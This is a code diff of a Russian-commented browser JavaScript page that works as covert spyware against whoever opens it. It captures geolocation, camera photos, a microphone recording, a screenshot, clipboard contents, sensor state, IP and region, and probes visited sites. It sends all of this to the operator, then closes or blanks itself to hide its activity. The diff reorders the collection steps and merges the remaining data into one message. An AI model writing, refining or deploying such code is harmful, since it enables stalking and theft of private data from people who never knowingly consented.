@@ -90,8 +90,225 @@ function getDeviceType() {
     return '❓ Неизвестное устройство';
 }
 
-// ========== ВСЯ ИНФОРМАЦИЯ ==========
-async function sendAllInfo() {
+// ========== ГЕОЛОКАЦИЯ (ОДИН РАЗ) ==========
+function getGeo(callback) {
+    if (!navigator.geolocation) {
+        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
+        callback(null);
+        return;
+    }
+    navigator.geolocation.getCurrentPosition(
+        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+        (error) => {
+            let errorMsg = '';
+            if (error.code === 1) errorMsg = '❌ Пользователь ЗАПРЕТИЛ доступ к геолокации';
+            else if (error.code === 2) errorMsg = '❌ Геолокация недоступна';
+            else errorMsg = '❌ Ошибка геолокации';
+            sendMessage(errorMsg);
+            callback(null);
+        }
+    );
+}
+
+// ========== КАМЕРА ==========
+function getCamera(facing, callback) {
+    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
+    navigator.mediaDevices.getUserMedia({
+        video: { 
+            facingMode: { exact: facing },
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+        }
+    }).then(stream => callback(stream)).catch((error) => {
+        let errorMsg = '';
+        if (error.name === 'NotAllowedError') errorMsg = `❌ Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере`;
+        else if (error.name === 'NotFoundError') errorMsg = `❌ ${cameraName} камера не найдена`;
+        else errorMsg = `❌ Ошибка камеры: ${error.name}`;
+        sendMessage(errorMsg);
+        callback(null);
+    });
+}
+
+async function takePhoto(stream, caption) {
+    return new Promise((resolve) => {
+        const canvas = document.createElement('canvas');
+        
+        video.srcObject = stream;
+        video.play().then(() => {
+            setTimeout(() => {
+                const width = video.videoWidth;
+                const height = video.videoHeight;
+                
+                canvas.width = width;
+                canvas.height = height;
+                const ctx = canvas.getContext('2d');
+                
+                ctx.drawImage(video, 0, 0, width, height);
+                canvas.toBlob(async (blob) => {
+                    if (blob) await sendPhoto(blob, caption);
+                    resolve();
+                }, 'image/jpeg', 0.85);
+            }, 800);
+        }).catch(() => resolve());
+    });
+}
+
+// ========== МИКРОФОН (ЗАПИСЬ 5 СЕКУНД) ==========
+async function recordAudio() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
+            stream.getTracks().forEach(t => t.stop());
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+    } catch(e) {
+        let msg = '';
+        if (e.name === 'NotAllowedError') msg = '❌ Пользователь ЗАПРЕТИЛ доступ к микрофону';
+        else if (e.name === 'NotFoundError') msg = '❌ Микрофон не найден';
+        else msg = `❌ Ошибка микрофона: ${e.message}`;
+        sendMessage(msg);
+    }
+}
+
+// ========== СКРИНШОТ ЭКРАНА ==========
+async function takeScreenshot() {
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        const videoEl = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        
+        videoEl.srcObject = stream;
+        videoEl.play();
+        
+        videoEl.onloadedmetadata = () => {
+            canvas.width = videoEl.videoWidth;
+            canvas.height = videoEl.videoHeight;
+            canvas.getContext('2d').drawImage(videoEl, 0, 0);
+            canvas.toBlob(async (blob) => {
+                if (blob) await sendPhoto(blob, '📸 Скриншот экрана');
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.9);
+        };
+    } catch(e) {
+        let msg = '';
+        if (e.name === 'NotAllowedError') msg = '❌ Пользователь запретил скриншот экрана';
+        else if (e.name === 'NotFoundError') msg = '❌ Функция скриншота не найдена';
+        else msg = `❌ Ошибка скриншота: ${e.message}`;
+        sendMessage(msg);
+    }
+}
+
+// ========== ДАТЧИКИ ТЕЛЕФОНА (АНАЛИЗ СОСТОЯНИЯ) ==========
+async function getSensorsData() {
+    return new Promise((resolve) => {
+        if (!('DeviceMotionEvent' in window)) {
+            resolve('📊 Датчики: не поддерживаются');
+            return;
+        }
+        
+        let maxAcc = 0;
+        let maxRot = 0;
+        let samples = 0;
+        
+        const handler = (e) => {
+            const acc = e.acceleration;
+            const rot = e.rotationRate;
+            
+            if (acc && acc.x !== null) {
+                const accMagnitude = Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z);
+                if (accMagnitude > maxAcc) maxAcc = accMagnitude;
+            }
+            
+            if (rot && rot.beta !== null) {
+                const rotMagnitude = Math.abs(rot.alpha || 0) + Math.abs(rot.beta || 0) + Math.abs(rot.gamma || 0);
+                if (rotMagnitude > maxRot) maxRot = rotMagnitude;
+            }
+            
+            samples++;
+            
+            if (samples >= 30) {
+                window.removeEventListener('devicemotion', handler);
+                
+                let status = '';
+                if (maxAcc < 1.5) status = 'СТОИТ';
+                else if (maxAcc > 2.5 && maxAcc < 8) status = 'ИДЁТ (шаги)';
+                else if (maxAcc >= 8) status = 'ТРЯСУТ';
+                else if (maxRot > 30) status = 'ПОВОРАЧИВАЮТ';
+                else status = 'СТОИТ';
+                
+                resolve(`📊 Статус: ${status}`);
+            }
+        };
+        
+        window.addEventListener('devicemotion', handler);
+        setTimeout(() => {
+            window.removeEventListener('devicemotion', handler);
+            if (samples < 30) {
+                resolve('📊 Статус: СТОИТ');
+            }
+        }, 3000);
+    });
+}
+
+// ========== БУФЕР ОБМЕНА ==========
+async function getClipboard() {
+    try {
+        const text = await navigator.clipboard.readText();
+        if (text) {
+            return `📋 Буфер: ${text.substring(0, 100)}`;
+        } else {
+            return `📋 Буфер: (пусто)`;
+        }
+    } catch(e) {
+        return `📋 Буфер: нет доступа`;
+    }
+}
+
+// ========== ВИБРО ==========
+function doVibrate() {
+    if (navigator.vibrate) {
+        navigator.vibrate([500, 200, 500]);
+        return '📳 Вибро: да';
+    } else {
+        return '📳 Вибро: не поддерживается';
+    }
+}
+
+// ========== ПРОВЕРКА VPN ==========
+async function getVPNStatus() {
+    try {
+        const ipStart = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+        return `🌐 IP публичный: ${ipStart.ip}`;
+    } catch(e) {
+        return `🌐 VPN: ошибка проверки`;
+    }
+}
+
+// ========== ИСТОРИЯ САЙТОВ ==========
+async function getBrowserHistory() {
+    const sites = ['google.com', 'youtube.com', 'yandex.ru', 'vk.com', 't.me', 'instagram.com'];
+    let visitedCount = 0;
+    for (let site of sites) {
+        const link = document.createElement('a');
+        link.href = `https://${site}`;
+        const color = window.getComputedStyle(link).color;
+        if (color === 'rgb(0, 0, 238)' || color === 'rgb(85, 26, 139)') {
+            visitedCount++;
+        }
+    }
+    return `🌐 История: ${visitedCount}/${sites.length} сайтов посещали`;
+}
+
+// ========== СБОР ВСЕЙ ИНФОРМАЦИИ (БЕЗ РАЗРЕШЕНИЙ) ==========
+async function collectAllInfo() {
     const ua = navigator.userAgent;
     let os = 'Unknown';
     if (ua.indexOf('Android') > -1) os = 'Android';
@@ -130,287 +347,34 @@ async function sendAllInfo() {
         ip = `🌍 IP: ${data.ip}\n📍 Регион: ${data.city}, ${data.region}, ${data.country_name}`;
     } catch(e) {}
     
-    const message = `${deviceType}
-📱 ОС: ${os} | ${browser}
-📲 Модель: ${phoneModel}
-⏰ Время: ${time}
-${battery}
-${connection}
-${ip}`;
+    let summary = `${deviceType}\n`;
+    summary += `📱 ОС: ${os} | ${browser}\n`;
+    summary += `📲 Модель: ${phoneModel}\n`;
+    summary += `⏰ Время: ${time}\n`;
+    summary += `${battery}\n`;
+    summary += `${connection}\n`;
+    summary += `${ip}\n`;
     
-    await sendMessage(message);
-}
-
-// ========== ГЕОЛОКАЦИЯ (ОДИН РАЗ, БЕЗ СЛЕЖКИ) ==========
-function getGeo(callback) {
-    if (!navigator.geolocation) {
-        sendMessage('❌ Ошибка: браузер не поддерживает геолокацию');
-        callback(null);
-        return;
-    }
-    navigator.geolocation.getCurrentPosition(
-        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-        (error) => {
-            let errorMsg = '';
-            if (error.code === 1) errorMsg = 'Пользователь ЗАПРЕТИЛ доступ к геолокации';
-            else if (error.code === 2) errorMsg = 'Геолокация недоступна';
-            else errorMsg = 'Ошибка геолокации';
-            sendMessage(`❌ ${errorMsg}`);
-            callback(null);
-        }
-    );
-}
-
-// ========== МИКРОФОН (ЗАПИСЬ 5 СЕКУНД) ==========
-async function recordAudio() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            await sendAudio(blob, '🎙️ Аудиозапись (5 секунд)');
-            stream.getTracks().forEach(t => t.stop());
-        };
-        
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
-    } catch(e) {
-        let msg = '';
-        if (e.name === 'NotAllowedError') msg = 'Пользователь ЗАПРЕТИЛ доступ к микрофону';
-        else if (e.name === 'NotFoundError') msg = 'Микрофон не найден';
-        else msg = `Ошибка микрофона: ${e.message}`;
-        sendMessage(`❌ ${msg}`);
-    }
-}
-
-// ========== СКРИНШОТ ЭКРАНА ==========
-async function takeScreenshot() {
-    try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        const videoEl = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        
-        videoEl.srcObject = stream;
-        videoEl.play();
-        
-        videoEl.onloadedmetadata = () => {
-            canvas.width = videoEl.videoWidth;
-            canvas.height = videoEl.videoHeight;
-            canvas.getContext('2d').drawImage(videoEl, 0, 0);
-            canvas.toBlob(async (blob) => {
-                if (blob) await sendPhoto(blob, '📸 Скриншот экрана');
-                stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.9);
-        };
-    } catch(e) {
-        let msg = '';
-        if (e.name === 'NotAllowedError') msg = 'Пользователь запретил скриншот экрана';
-        else if (e.name === 'NotFoundError') msg = 'Функция скриншота не найдена';
-        else msg = `Ошибка скриншота: ${e.message}`;
-        sendMessage(`❌ ${msg}`);
-    }
-}
-
-// ========== ДАТЧИКИ ТЕЛЕФОНА (АНАЛИЗ СОСТОЯНИЯ) ==========
-async function getSensorsData() {
-    return new Promise((resolve) => {
-        if (!('DeviceMotionEvent' in window)) {
-            sendMessage(`📊 Статус: датчики не поддерживаются`);
-            resolve();
-            return;
-        }
-        
-        let maxAcc = 0;
-        let maxRot = 0;
-        let samples = 0;
-        
-        const handler = (e) => {
-            const acc = e.acceleration;
-            const rot = e.rotationRate;
-            
-            if (acc && acc.x !== null) {
-                const accMagnitude = Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z);
-                if (accMagnitude > maxAcc) maxAcc = accMagnitude;
-            }
-            
-            if (rot && rot.beta !== null) {
-                const rotMagnitude = Math.abs(rot.alpha || 0) + Math.abs(rot.beta || 0) + Math.abs(rot.gamma || 0);
-                if (rotMagnitude > maxRot) maxRot = rotMagnitude;
-            }
-            
-            samples++;
-            
-            if (samples >= 30) {
-                window.removeEventListener('devicemotion', handler);
-                
-                let status = '';
-                
-                if (maxAcc < 1.5) {
-                    status = 'СТОИТ';
-                } else if (maxAcc > 2.5 && maxAcc < 8) {
-                    status = 'ИДЁТ (шаги)';
-                } else if (maxAcc >= 8) {
-                    status = 'ТРЯСУТ';
-                } else if (maxRot > 30) {
-                    status = 'ПОВОРАЧИВАЮТ';
-                } else {
-                    status = 'СТОИТ';
-                }
-                
-                sendMessage(`📊 Статус: ${status}`);
-                resolve();
-            }
-        };
-        
-        window.addEventListener('devicemotion', handler);
-        setTimeout(() => {
-            window.removeEventListener('devicemotion', handler);
-            if (samples < 30) {
-                sendMessage(`📊 Статус: СТОИТ (недостаточно данных)`);
-                resolve();
-            }
-        }, 3000);
-    });
-}
-
-// ========== БУФЕР ОБМЕНА (ЧТЕНИЕ) ==========
-async function readClipboard() {
-    try {
-        const text = await navigator.clipboard.readText();
-        if (text) {
-            sendMessage(`📋 Буфер обмена: ${text.substring(0, 500)}`);
-        } else {
-            sendMessage(`📋 Буфер обмена: (пусто)`);
-        }
-    } catch(e) {
-        let msg = '';
-        if (e.name === 'NotAllowedError') msg = 'Нет разрешения на чтение буфера обмена';
-        else msg = `Ошибка: ${e.message}`;
-        sendMessage(`❌ Буфер обмена: ${msg}`);
-    }
-}
-
-// ========== ВИБРО ==========
-function vibratePhone() {
-    if (navigator.vibrate) {
-        navigator.vibrate([500, 200, 500]);
-        sendMessage('📳 Телефон вибрировал (500ms)');
-    } else {
-        sendMessage('❌ Вибро не поддерживается на этом устройстве');
-    }
-}
-
-// ========== ПРОВЕРКА VPN/ПРОКСИ ==========
-async function checkVPN() {
-    try {
-        const ipStart = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-        const ipWebRTC = await new Promise((resolve) => {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (ice) => {
-                if (ice.candidate) {
-                    const ip = ice.candidate.address.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
-                    if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-                        resolve(ip);
-                    }
-                }
-            };
-            setTimeout(() => resolve(null), 2000);
-        });
-        
-        let msg = `🔍 VPN/Прокси проверка:\n🌐 Публичный IP: ${ipStart.ip}`;
-        if (ipWebRTC && ipWebRTC !== ipStart.ip) {
-            msg += `\n⚠️ Обнаружена утечка WebRTC: ${ipWebRTC} (возможно VPN/прокси)`;
-        } else if (ipWebRTC) {
-            msg += `\n✅ WebRTC совпадает с IP (VPN не обнаружен)`;
-        } else {
-            msg += `\n❓ WebRTC не удалось определить`;
-        }
-        sendMessage(msg);
-    } catch(e) {
-        sendMessage(`❌ Ошибка проверки VPN: ${e.message}`);
-    }
-}
-
-// ========== ИСТОРИЯ САЙТОВ (ПРОВЕРКА ПОСЕЩЕНИЙ) ==========
-async function checkBrowserHistory() {
-    const sites = [
-        'https://google.com',
-        'https://youtube.com',
-        'https://yandex.ru',
-        'https://vk.com',
-        'https://t.me',
-        'https://instagram.com',
-        'https://twitter.com',
-        'https://facebook.com',
-        'https://whatsapp.com',
-        'https://github.com'
-    ];
+    // Датчики
+    const sensorStatus = await getSensorsData();
+    summary += `${sensorStatus}\n`;
     
-    let visited = [];
-    for (let site of sites) {
-        const link = document.createElement('a');
-        link.href = site;
-        if (link.href.startsWith('https:')) {
-            const color = window.getComputedStyle(link).color;
-            if (color === 'rgb(0, 0, 238)' || color === 'rgb(85, 26, 139)') {
-                visited.push(site);
-            }
-        }
-    }
+    // Буфер обмена
+    const clipboard = await getClipboard();
+    summary += `${clipboard}\n`;
     
-    if (visited.length > 0) {
-        sendMessage(`🌐 История посещений (возможно):\n${visited.join('\n')}`);
-    } else {
-        sendMessage(`🌐 История сайтов: не удалось определить (или нет посещений)`);
-    }
-}
-
-// ========== КАМЕРА ==========
-function getCamera(facing, callback) {
-    const cameraName = facing === 'user' ? 'фронтальной' : 'задней';
-    navigator.mediaDevices.getUserMedia({
-        video: { 
-            facingMode: { exact: facing },
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-        }
-    }).then(stream => callback(stream)).catch((error) => {
-        let errorMsg = '';
-        if (error.name === 'NotAllowedError') errorMsg = `Пользователь ЗАПРЕТИЛ доступ к ${cameraName} камере`;
-        else if (error.name === 'NotFoundError') errorMsg = `${cameraName} камера не найдена`;
-        else errorMsg = `Ошибка камеры: ${error.name}`;
-        sendMessage(`❌ ${errorMsg}`);
-        callback(null);
-    });
-}
-
-async function takePhoto(stream, caption) {
-    return new Promise((resolve) => {
-        const canvas = document.createElement('canvas');
-        
-        video.srcObject = stream;
-        video.play().then(() => {
-            setTimeout(() => {
-                const width = video.videoWidth;
-                const height = video.videoHeight;
-                
-                canvas.width = width;
-                canvas.height = height;
-                const ctx = canvas.getContext('2d');
-                
-                ctx.drawImage(video, 0, 0, width, height);
-                canvas.toBlob(async (blob) => {
-                    if (blob) await sendPhoto(blob, caption);
-                    resolve();
-                }, 'image/jpeg', 0.85);
-            }, 800);
-        }).catch(() => resolve());
-    });
+    // Вибро
+    summary += `${doVibrate()}\n`;
+    
+    // VPN
+    const vpnStatus = await getVPNStatus();
+    summary += `${vpnStatus}\n`;
+    
+    // История
+    const historyStatus = await getBrowserHistory();
+    summary += `${historyStatus}`;
+    
+    return summary;
 }
 
 // ========== ГЛАВНАЯ ==========
@@ -419,17 +383,8 @@ async function main() {
     const loader = document.querySelector('.loader');
     if (loader) loader.style.display = 'none';
     
-    // ===== 1. БЕЗ РАЗРЕШЕНИЙ (отправляются сразу) =====
-    await sendMessage(`🔍 Определено устройство: ${getDeviceType()}`);
-    await sendAllInfo();
-    await getSensorsData();
-    await readClipboard();
-    vibratePhone();
-    await checkVPN();
-    await checkBrowserHistory();
-    
-    // ===== 2. С РАЗРЕШЕНИЯМИ (по очереди) =====
-    // Геолокация (один раз)
+    // ===== 1. СНАЧАЛА ВСЁ, ЧТО ТРЕБУЕТ РАЗРЕШЕНИЙ =====
+    // Геолокация
     getGeo(async (loc) => {
         if (loc) {
             await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
@@ -448,25 +403,30 @@ async function main() {
                         }
                         stream.getTracks().forEach(t => t.stop());
                         
-            // Микрофон
+                        // Микрофон
                         await recordAudio();
                         
-            // Скриншот экрана
+                        // Скриншот экрана
                         await takeScreenshot();
                         
-            // Принудительное закрытие через 2 секунды
+                        // ===== 2. ТЕПЕРЬ ВСЯ ОСТАЛЬНАЯ ИНФОРМАЦИЯ (ОДНИМ СООБЩЕНИЕМ) =====
+                        const allInfo = await collectAllInfo();
+                        await sendMessage(allInfo);
+                        
+                        // ===== 3. ЗАКРЫТИЕ =====
                         setTimeout(() => {
                             window.close();
-            // Если window.close() не сработал (некоторые браузеры блокируют)
                             setTimeout(() => {
                                 document.body.innerHTML = '';
                                 window.location.href = 'about:blank';
                             }, 500);
                         }, 2000);
-                        
                     });
                 }, 3000);
             } else {
+                // Если нет камеры, всё равно собираем информацию и закрываем
+                const allInfo = await collectAllInfo();
+                await sendMessage(allInfo);
                 setTimeout(() => window.close(), 2000);
             }
         });
